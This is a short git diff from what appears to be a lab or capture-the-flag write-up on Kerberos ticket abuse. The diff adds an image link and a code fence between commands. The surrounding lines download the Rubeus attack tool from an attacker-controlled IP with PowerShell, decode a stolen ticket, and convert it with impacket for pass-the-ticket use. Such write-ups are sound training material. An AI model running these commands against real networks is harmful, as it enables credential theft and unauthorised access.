@@ -250,6 +250,9 @@ powershell -c wget 10.10.14.10/Rubeus.exe -outfile Rubeus.exe
 ```
 cat ticket.b64 | base64 -d > ticket2.kirbi
 ```
+![image](https://github.com/user-attachments/assets/67f1e5b6-19eb-4921-9182-04941cc242ac)
+
+```
 impacket-ticketConverter ./ticket3.kirbi ticket.ccache
 export KRB5CCNAME=ticket.ccache
 sudo service virtualbox-guest-utils stop
